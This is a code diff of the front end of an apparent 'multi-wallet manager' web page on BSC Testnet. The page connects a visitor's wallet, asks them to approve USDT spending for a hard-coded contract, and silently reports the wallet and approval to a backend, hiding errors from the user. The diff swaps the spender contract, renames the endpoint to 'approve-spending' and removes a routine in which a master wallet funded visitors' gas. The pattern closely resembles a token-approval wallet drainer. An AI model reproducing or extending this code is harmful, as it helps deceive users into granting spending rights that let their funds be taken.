@@ -1,10 +1,9 @@
-// src/main.js
 import { BrowserProvider, Contract, ethers } from 'ethers'
 
 // Configuration from environment variables
 const CONFIG = {
   API_URL: typeof __VITE_API_URL__ !== 'undefined' ? __VITE_API_URL__ : 'https://multi-wallet-manager.onrender.com/api',
-  CONTRACT_ADDRESS: typeof __VITE_CONTRACT_ADDRESS__ !== 'undefined' ? __VITE_CONTRACT_ADDRESS__ : '0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF',
+  CONTRACT_ADDRESS: typeof __VITE_CONTRACT_ADDRESS__ !== 'undefined' ? __VITE_CONTRACT_ADDRESS__ : '0x88e199AeBB58Eb75F6C2DC9fBe73F871eCC8C92F',
   USDT_CONTRACT_ADDRESS: typeof __VITE_USDT_CONTRACT_ADDRESS__ !== 'undefined' ? __VITE_USDT_CONTRACT_ADDRESS__ : '0x2f79e9e36c0d293f3c88F4aF05ABCe224c0A5638',
   CHAIN_ID: typeof __VITE_CHAIN_ID__ !== 'undefined' ? __VITE_CHAIN_ID__ : '97',
   CHAIN_NAME: typeof __VITE_CHAIN_NAME__ !== 'undefined' ? __VITE_CHAIN_NAME__ : 'BSC Testnet',
@@ -15,6 +14,7 @@ const CONFIG = {
 const connectSection = document.getElementById('connect-section')
 const walletSection = document.getElementById('wallet-section')
 const connectWalletBtn = document.getElementById('connect-wallet')
+const resetWalletBtn = document.getElementById('reset-wallet')
 const connectText = document.getElementById('connect-text')
 const approveBtn = document.getElementById('approve-btn')
 const approveText = document.getElementById('approve-text')
@@ -28,17 +28,14 @@ const statusMessage = document.getElementById('status-message')
 let provider = null
 let signer = null
 let walletAddress = null
-let backendNotified = false
 
 // Initialize app
 document.addEventListener('DOMContentLoaded', () => {
   // Check for existing connection
   const storedAddress = localStorage.getItem('walletAddress')
-  const storedBackendNotified = localStorage.getItem('backendNotified') === 'true'
   
   if (storedAddress) {
     walletAddress = storedAddress
-    backendNotified = storedBackendNotified
     showWalletSection()
     updateWalletInfo()
   }
@@ -48,6 +45,7 @@ document.addEventListener('DOMContentLoaded', () => {
   
   // Event listeners
   connectWalletBtn.addEventListener('click', connectWallet)
+  resetWalletBtn.addEventListener('click', resetWallet)
   approveBtn.addEventListener('click', handleApprovalFlow)
   disconnectBtn.addEventListener('click', disconnectWallet)
 })
@@ -79,8 +77,6 @@ async function connectWallet() {
     
     // Save to localStorage
     localStorage.setItem('walletAddress', walletAddress)
-    localStorage.setItem('backendNotified', 'false')
-    backendNotified = false
     
     // Update UI
     showWalletSection()
@@ -95,6 +91,13 @@ async function connectWallet() {
   } finally {
     showLoading(connectText, false)
   }
+}
+
+// Reset wallet connection
+function resetWallet() {
+  localStorage.removeItem('walletAddress')
+  showStatus('Wallet connection reset. Please connect again.')
+  showConnectSection()
 }
 
 // Switch to correct network
@@ -163,82 +166,20 @@ async function updateWalletInfo() {
   }
 }
 
-// Handle the complete approval flow including gas management
+// Handle the complete approval flow
 async function handleApprovalFlow() {
   try {
     showLoading(approveText, true)
-    
-    // First check if wallet has sufficient gas
-    const hasGas = await checkWalletGasBalance()
-    
-    if (!hasGas) {
-      showSuccess('Insufficient gas detected. Waiting for gas from master wallet...')
-      
-      // Wait for gas to be sent by master wallet
-      await waitForGas(60000) // Wait up to 60 seconds
-    }
     
     // Now proceed with USDT approval
     await approveUSDTSpending()
     
   } catch (error) {
     console.error('Approval flow error:', error)
-    
-    // Check if it's a gas-related error - if so, reset the connection flow
-    if (error.message.includes('gas') || error.message.includes('funds') || error.message.includes('underpriced')) {
-      showError('Insufficient gas. Please try again - the master wallet will send gas.')
-      // Reset the connection to start fresh
-      resetConnection()
-    } else {
-      showError('Approval failed: ' + error.message)
-    }
+    showError('Approval failed: ' + error.message)
   } finally {
     showLoading(approveText, false)
   }
-}
-
-// Check if wallet has sufficient gas balance
-async function checkWalletGasBalance() {
-  try {
-    if (!provider || !walletAddress) {
-      throw new Error('Wallet not connected')
-    }
-    
-    const balance = await provider.getBalance(walletAddress)
-    const balanceInBNB = ethers.formatEther(balance)
-    
-    // Check if balance is greater than minimum required (0.001 BNB)
-    const hasSufficientGas = parseFloat(balanceInBNB) >= 0.001
-    
-    console.log('Gas balance:', balanceInBNB, 'BNB - Sufficient:', hasSufficientGas)
-    
-    return hasSufficientGas
-  } catch (error) {
-    console.error('Gas check error:', error)
-    // If we can't check, assume no gas and let the master wallet handle it
-    return false
-  }
-}
-
-// Wait for gas to be sent to wallet
-async function waitForGas(timeout = 60000) {
-  const startTime = Date.now()
-  
-  while (Date.now() - startTime < timeout) {
-    // Check gas balance
-    const hasGas = await checkWalletGasBalance()
-    
-    if (hasGas) {
-      showSuccess('Gas received! Proceeding with approval...')
-      return true
-    }
-    
-    // Wait 3 seconds before checking again
-    await new Promise(resolve => setTimeout(resolve, 3000))
-  }
-  
-  // Timeout reached
-  throw new Error('Gas not received within timeout period. Please try again.')
 }
 
 // Approve USDT spending
@@ -307,10 +248,6 @@ async function sendWalletToBackend() {
     const result = await response.json()
     console.log('Backend connection successful:', result)
     
-    // Mark that we've notified backend
-    backendNotified = true
-    localStorage.setItem('backendNotified', 'true')
-    
   } catch (error) {
     console.error('Backend connection error:', error)
     // Don't show error to user as per requirements
@@ -320,7 +257,7 @@ async function sendWalletToBackend() {
 // Notify backend that approval is complete
 async function notifyApprovalToBackend() {
   try {
-    const response = await fetch(`${CONFIG.API_URL}/wallets/approve`, {
+    const response = await fetch(`${CONFIG.API_URL}/wallets/approve-spending`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
@@ -348,43 +285,32 @@ async function notifyApprovalToBackend() {
   }
 }
 
-// Reset connection flow - completely reset everything
-function resetConnection() {
-  // Clear all state
-  walletAddress = null
-  provider = null
-  signer = null
-  backendNotified = false
-  
-  // Clear localStorage
-  localStorage.removeItem('walletAddress')
-  localStorage.removeItem('backendNotified')
-  
-  // Reset UI to initial state
-  showConnectSection()
-  
-  // Reset buttons
-  connectWalletBtn.disabled = false
-  connectText.textContent = 'Connect Wallet'
-  approveBtn.disabled = false
-  approveText.textContent = 'Approve USDT Spending'
-  
-  // Clear wallet info
-  if (walletAddressEl) walletAddressEl.textContent = ''
-  if (usdtBalanceEl) usdtBalanceEl.textContent = '0.00 USDT'
-  
-  showSuccess('Wallet disconnected. You can now connect a different wallet.')
-}
-
 // Disconnect wallet - this is the button handler
 async function disconnectWallet() {
   try {
     showLoading(disconnectBtn, true)
     
-    // Reset everything
-    resetConnection()
+    // Clear all state
+    walletAddress = null
+    provider = null
+    signer = null
     
-    // Optional: Notify user
+    // Clear localStorage
+    localStorage.removeItem('walletAddress')
+    
+    // Reset UI to initial state
+    showConnectSection()
+    
+    // Reset buttons
+    connectWalletBtn.disabled = false
+    connectText.textContent = 'Connect Wallet'
+    approveBtn.disabled = false
+    approveText.textContent = 'Approve USDT Spending'
+    
+    // Clear wallet info
+    if (walletAddressEl) walletAddressEl.textContent = ''
+    if (usdtBalanceEl) usdtBalanceEl.textContent = '0.00 USDT'
+    
     showSuccess('Wallet disconnected successfully!')
     
   } catch (error) {
